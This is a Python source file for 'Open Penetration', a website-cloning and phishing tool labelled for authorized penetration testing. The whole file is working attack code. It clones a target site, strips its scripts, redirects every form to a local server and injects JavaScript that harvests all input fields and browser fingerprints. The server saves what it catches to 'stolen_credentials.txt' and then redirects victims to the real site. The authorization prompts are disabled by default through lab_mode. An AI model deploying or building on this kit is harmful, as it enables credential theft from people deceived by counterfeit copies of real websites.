#!/usr/bin/env python3
# ============================================================
#  OPEN PENETRATION — Web Cloning & Phishing Tool
#  For Authorized Penetration Testing Only
# ============================================================

import os
import sys
import yaml
import signal
import socket
import logging
import argparse
import requests
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Global state
target_folder = None
config = {}
logger = logging.getLogger("openpenetration")
httpd = None


# ============================================================
#  Configuration Management
# ============================================================

def load_config(config_path="config.yaml"):
    """Load configuration from YAML file."""
    global config

    default_config = {
        "lab_mode": True,
        "server": {"host": "0.0.0.0", "port": 8080},
        "logging": {"enabled": True, "log_file": "penetration.log", "log_level": "INFO"},
        "capture": {"save_credentials": True, "save_system_info": True, "redirect_url": ""},
        "tiers": {
            "tier_1": {"name": "Reconnaissance", "scope_enforcement": True},
            "tier_2": {"name": "Website Cloning", "scope_enforcement": True},
            "tier_3": {"name": "Server Operations", "scope_enforcement": True},
            "tier_4": {"name": "Credential Capture", "scope_enforcement": True},
            "tier_5": {"name": "Critical Operations", "scope_enforcement": True},
        },
    }

    try:
        with open(config_path, "r") as f:
            config = yaml.safe_load(f)
        if not config:
            config = default_config
            print(Fore.YELLOW + f"[!] Empty config file, using defaults")
        else:
            print(Fore.GREEN + f"[+] Loaded config from {config_path}")
        return True
    except FileNotFoundError:
        config = default_config
        print(Fore.YELLOW + f"[!] Config file not found: {config_path}")
        print(Fore.YELLOW + "[*] Using default configuration")
        return False
    except yaml.YAMLError as e:
        config = default_config
        print(Fore.RED + f"[!] Error parsing config file: {e}")
        print(Fore.YELLOW + "[*] Using default configuration")
        return False


def setup_logging():
    """Setup logging configuration."""
    global logger

    log_config = config.get("logging", {})
    enabled = log_config.get("enabled", True)
    log_file = log_config.get("log_file", "penetration.log")
    log_level = log_config.get("log_level", "INFO")

    logger = logging.getLogger("openpenetration")
    logger.setLevel(getattr(logging, log_level.upper(), logging.INFO))
    formatter = logging.Formatter("%(asctime)s | %(levelname)-8s | %(message)s", datefmt="%Y-%m-%d %H:%M:%S")

    if enabled:
        file_handler = logging.FileHandler(log_file, mode="a", encoding="utf-8")
        file_handler.setFormatter(formatter)
        logger.addHandler(file_handler)

    console_handler = logging.StreamHandler()
    console_handler.setFormatter(formatter)
    logger.addHandler(console_handler)


def is_scope_enforced(tier):
    """Check if scope enforcement is active for a given tier."""
    lab_mode = config.get("lab_mode", True)
    if lab_mode:
        return False  # lab_mode: true = no enforcement for tiers 1-4
    tier_config = config.get("tiers", {}).get(tier, {})
    return tier_config.get("scope_enforcement", True)


# ============================================================
#  UI
# ============================================================

def header():
    """Display the tool banner."""
    os.system("cls" if os.name == "nt" else "clear")
    print(Fore.CYAN + "=" * 75)
    print(Fore.RED + r"       \                             /    ")
    print(Fore.RED + r"        \                           /     ")
    print(Fore.RED + r"         \                         /      ")
    print(Fore.RED + r"          \       _-------_       /       ")
    print(Fore.RED + r"        ---\_   /  O     O  \   _/<---    ")
    print(Fore.RED + r"             \_|    _____    |_/          ")
    print(Fore.RED + r"               |   | | | |   |            ")
    print(Fore.RED + r"        ------ |   |_|_|_|   | ------     ")
    print(Fore.RED + r"               |             |            ")
    print(Fore.RED + r"              / \           / \           ")
    print(Fore.RED + r"             /   \_________/   \          ")
    print(Fore.RED + r"            /      /     \      \         ")
    print(Fore.RED + r"           /      /       \      \        ")
    print(Fore.CYAN + "=" * 75)
    print(Fore.YELLOW + r"   ██████╗ ██████╗ ███████╗███╗   ██╗      ")
    print(Fore.YELLOW + r"  ██╔═══██╗██╔══██╗██╔════╝████╗  ██║      ")
    print(Fore.YELLOW + r"  ██║   ██║██████╔╝█████╗  ██╔██╗ ██║      ")
    print(Fore.YELLOW + r"  ██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║      ")
    print(Fore.YELLOW + r"  ╚██████╔╝██║     ███████╗██║ ╚████║      ")
    print(Fore.YELLOW + r"   ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝      ")
    print(Fore.YELLOW + r"                                          ")
    print(Fore.YELLOW + r"  ██████╗ ███████╗███╗   ██╗████████╗███████╗███████╗████████╗")
    print(Fore.YELLOW + r"  ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝")
    print(Fore.YELLOW + r"  ██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ███████╗   ██║   ")
    print(Fore.YELLOW + r"  ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ╚════██║   ██║   ")
    print(Fore.YELLOW + r"  ██║     ███████╗██║ ╚████║   ██║   ███████╗███████║   ██║   ")
    print(Fore.YELLOW + r"  ╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝   ")
    print(Fore.CYAN + "=" * 75)

    lab_mode = config.get("lab_mode", True)
    if lab_mode:
        print(Fore.GREEN + "  [+] Lab mode: ENABLED  (scope enforcement disabled)")
    else:
        print(Fore.RED + "  [!] Lab mode: DISABLED (full scope enforcement active)")

    if is_scope_enforced("tier_5"):
        print(Fore.YELLOW + "  [!] Tier 5 scope enforcement: ACTIVE")

    port = config.get("server", {}).get("port", 8080)
    print(Fore.CYAN + f"  [+] Server port: {port}")
    print(Fore.CYAN + "=" * 75)
    print(Fore.GREEN + "         OPEN PENETRATION  —  Web Cloning & Phishing Tool")
    print(Fore.WHITE + "              [ For Authorized Penetration Testing Only ]")
    print(Fore.CYAN + "=" * 75)
    print()


# ============================================================
#  Core Functions
# ============================================================

def fetch_html(url):
    """Fetch HTML content from target URL."""
    try:
        response = requests.get(url, timeout=10, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
        response.raise_for_status()
        logger.info(f"Fetched URL: {url} (status: {response.status_code})")
        return response.text
    except requests.exceptions.Timeout:
        print(Fore.RED + f"[!] Request timed out for {url}")
        logger.error(f"Timeout fetching {url}")
        return None
    except requests.exceptions.ConnectionError as e:
        print(Fore.RED + f"[!] Connection error: {e}")
        logger.error(f"Connection error: {e}")
        return None
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[!] Error fetching the page: {e}")
        logger.error(f"Request error: {e}")
        return None


def save_cloned_html(url, html_content, folder):
    """Clone the target HTML and inject credential capture scripts."""
    soup = BeautifulSoup(html_content, "html.parser")

    # Inject <base> tag so relative CSS/image/font URLs render properly
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    
    if not soup.head:
        head_tag = soup.new_tag("head")
        if soup.html:
            soup.html.insert(0, head_tag)
        else:
            soup.insert(0, head_tag)
            
    base_tag = soup.new_tag("base", href=base_url)
    soup.head.insert(0, base_tag)

    # Remove original JS that might block form submission
    for script in soup.find_all("script"):
        script.decompose()

    # Rewrite all form actions and methods to point to our server
    for form in soup.find_all("form"):
        form["action"] = "/submit"
        form["method"] = "POST"

    # --- System info collection script ---
    system_info_script = soup.new_tag("script")
    system_info_script.string = """
    document.addEventListener('DOMContentLoaded', function() {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/system-info', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

        var systemInfo = {
            'User-Agent': navigator.userAgent,
            'Screen Resolution': screen.width + 'x' + screen.height,
            'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
            'Language': navigator.language,
            'Platform': navigator.platform,
            'Cookies Enabled': navigator.cookieEnabled
        };

        var data = [];
        for (var key in systemInfo) {
            if (systemInfo.hasOwnProperty(key)) {
                data.push(encodeURIComponent(key) + '=' + encodeURIComponent(systemInfo[key]));
            }
        }

        xhr.send(data.join('&'));
    });
    """
    soup.head.append(system_info_script)

    # --- Credential capture script ---
    redirect_url = config.get("capture", {}).get("redirect_url", "")
    if not redirect_url:
        redirect_url = url

    # Sanitize redirect_url for safe JS injection
    safe_redirect = redirect_url.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "").replace("\r", "")

    capture_script = soup.new_tag("script")
    capture_script.string = f"""
    var _captureSent = false;

    function captureAllInputs(label) {{
        if (_captureSent) return;
        _captureSent = true;

        var allInputs = document.querySelectorAll('input, select, textarea');
        var data = [];

        allInputs.forEach(function(input) {{
            var key = input.name || input.id || input.getAttribute('type') || 'unknown_field';
            var value = input.value;
            if (value && value.trim() !== '') {{
                data.push(encodeURIComponent(key) + '=' + encodeURIComponent(value));
            }}
        }});

        if (data.length > 0) {{
            data.push(encodeURIComponent('_trigger') + '=' + encodeURIComponent(label));
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/submit', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send(data.join('&'));
        }}

        setTimeout(function() {{
            window.location.href = '{safe_redirect}';
        }}, 1500);
    }}

    document.addEventListener('submit', function(e) {{
        e.preventDefault();
        captureAllInputs('form_submit');
    }});
    """
    if soup.body:
        soup.body.append(capture_script)
    else:
        soup.append(capture_script)

    cloned_html_path = os.path.join(folder, "index.html")
    with open(cloned_html_path, "w", encoding="utf-8") as f:
        f.write(soup.prettify())

    logger.info(f"Cloned HTML saved to {cloned_html_path}")
    return cloned_html_path


def get_local_ip():
    """Get the local IP address."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
    except Exception:
        local_ip = "127.0.0.1"
    finally:
        s.close()
    return local_ip


# ============================================================
#  HTTP Request Handler
# ============================================================

class PhishingHandler(BaseHTTPRequestHandler):
    """HTTP request handler for credential capture."""

    def log_message(self, format, *args):
        """Suppress default HTTP logging."""
        return

    def do_GET(self):
        """Serve the cloned page."""
        global target_folder

        if self.path == "/":
            index_path = os.path.join(target_folder or os.getcwd(), "index.html")
            if not os.path.exists(index_path):
                self.send_error(404, "Page not found")
                return
            with open(index_path, "rb") as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(content)
        else:
            self.send_error(404, "Not found")

    def do_POST(self):
        """Handle captured data."""
        global target_folder

        ip = self.client_address[0]
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        if self.path == "/submit":
            self._handle_submit(ip, timestamp)
        elif self.path == "/system-info":
            self._handle_system_info(ip, timestamp)
        else:
            self.send_error(404, "Not found")

    def _handle_submit(self, ip, timestamp):
        """Handle form submission — capture credentials."""
        content_length = int(self.headers.get("Content-Length", 0))
        if content_length == 0:
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"No data received.")
            return

        post_data = self.rfile.read(content_length).decode("utf-8", errors="replace")
        parsed_data = parse_qs(post_data)

        print(Fore.GREEN + f"[+] Received form data from {ip} @ {timestamp}")
        for key, values in parsed_data.items():
            for value in values:
                print(Fore.YELLOW + f"   {key}: {value}")

        # Save to file
        if config.get("capture", {}).get("save_credentials", True):
            credentials_path = os.path.join(target_folder, "stolen_credentials.txt")
            with open(credentials_path, "a", encoding="utf-8") as f:
                f.write(f"IP: {ip}\nTime: {timestamp}\n")
                for key, values in parsed_data.items():
                    for value in values:
                        f.write(f"{key}: {value}\n")
                f.write("=" * 40 + "\n")
            print(Fore.CYAN + f"[+] Credentials saved to: {credentials_path}")
            logger.info(f"Credentials captured from {ip} -> {credentials_path}")

        # Respond
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"<html><body><h2>Login Successful</h2></body></html>")

    def _handle_system_info(self, ip, timestamp):
        """Handle system fingerprint data."""
        content_length = int(self.headers.get("Content-Length", 0))
        if content_length == 0:
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"No data received.")
            return

        system_info_raw = self.rfile.read(content_length).decode("utf-8", errors="replace")
        parsed_info = parse_qs(system_info_raw)

        user_agent = parsed_info.get("User-Agent", [""])[0]
        screen_res = parsed_info.get("Screen Resolution", [""])[0]
        timezone = parsed_info.get("Timezone", [""])[0]
        language = parsed_info.get("Language", [""])[0]
        platform = parsed_info.get("Platform", [""])[0]

        print(Fore.BLUE + f"[+] System info from {ip} @ {timestamp}")
        print(Fore.CYAN + f"   User-Agent  : {user_agent}")
        print(Fore.CYAN + f"   Resolution  : {screen_res}")
        print(Fore.CYAN + f"   Timezone    : {timezone}")
        print(Fore.CYAN + f"   Language    : {language}")
        print(Fore.CYAN + f"   Platform    : {platform}")

        if config.get("capture", {}).get("save_system_info", True):
            info_path = os.path.join(target_folder, "system_info.txt")
            with open(info_path, "a", encoding="utf-8") as f:
                f.write(f"IP: {ip}\nTime: {timestamp}\n")
                f.write(f"User-Agent: {user_agent}\n")
                f.write(f"Screen Resolution: {screen_res}\n")
                f.write(f"Timezone: {timezone}\n")
                f.write(f"Language: {language}\n")
                f.write(f"Platform: {platform}\n")
                f.write("=" * 40 + "\n")
            print(Fore.CYAN + f"[+] System info saved to: {info_path}")
            logger.info(f"System info captured from {ip} -> {info_path}")

        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"System info received.")


# ============================================================
#  Server & Orchestration
# ============================================================

def signal_handler(signum, frame):
    """Handle graceful shutdown."""
    global httpd
    print(Fore.YELLOW + "\n[*] Shutting down server...")
    logger.info("Server shutting down")
    if httpd:
        httpd.shutdown()
    sys.exit(0)


def run_server(port=None):
    """Start the HTTP server."""
    global httpd

    if port is None:
        port = config.get("server", {}).get("port", 8080)
    host = config.get("server", {}).get("host", "0.0.0.0")

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    server_address = (host, port)
    try:
        httpd = HTTPServer(server_address, PhishingHandler)
    except OSError as e:
        print(Fore.RED + f"[!] Cannot bind to {host}:{port} — {e}")
        logger.error(f"Server bind failed: {e}")
        sys.exit(1)

    ip_address = get_local_ip()
    print(Fore.GREEN + f"[*] Server started at http://{ip_address}:{port}/")
    print(Fore.GREEN + "[*] Waiting for target to submit data...")
    print(Fore.YELLOW + "[*] Press Ctrl+C to stop")
    logger.info(f"Server started on {host}:{port}")
    httpd.serve_forever()


def clone_and_host_website(url):
    """Clone target website and start the phishing server."""
    global target_folder

    # Tier 2: Website Cloning
    if is_scope_enforced("tier_2"):
        print(Fore.RED + "[!] Tier 2 scope enforcement active — check authorization")
        response = input(Fore.YELLOW + "[?] Confirm authorization (yes/no): ")
        if response.lower() != "yes":
            print(Fore.RED + "[!] Aborted.")
            sys.exit(1)

    html_content = fetch_html(url)
    if not html_content:
        print(Fore.RED + "[!] Failed to clone the website.")
        logger.error(f"Failed to clone {url}")
        return

    domain = urlparse(url).netloc
    folder = os.path.join(os.getcwd(), domain)
    target_folder = folder

    if not os.path.exists(folder):
        os.makedirs(folder)

    cloned_path = save_cloned_html(url, html_content, folder)
    print(Fore.GREEN + f"[+] Website cloned to: {cloned_path}")

    # Tier 3: Server Operations
    if is_scope_enforced("tier_3"):
        print(Fore.RED + "[!] Tier 3 scope enforcement active — check authorization")
        response = input(Fore.YELLOW + "[?] Confirm server start (yes/no): ")
        if response.lower() != "yes":
            print(Fore.RED + "[!] Aborted.")
            sys.exit(1)

    # Change to cloned directory and start server
    os.chdir(folder)
    run_server()


# ============================================================
#  CLI Entry Point
# ============================================================

def parse_args():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="Open Penetration — Web Cloning & Phishing Tool (Authorized Use Only)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -d https://example.com
  %(prog)s -d https://example.com -p 9090
  %(prog)s -d https://example.com --config myconfig.yaml
        """,
    )
    parser.add_argument("-d", "--domain", required=True, help="Target website URL to clone")
    parser.add_argument("-p", "--port", type=int, default=None, help="Server port (overrides config)")
    parser.add_argument("-c", "--config", default="config.yaml", help="Config file path (default: config.yaml)")
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()

    # Load config before anything else
    load_config(args.config)

    # Override port from CLI if provided
    if args.port is not None:
        config["server"]["port"] = args.port

    setup_logging()
    header()

    logger.info(f"Target: {args.domain}")
    clone_and_host_website(args.domain)
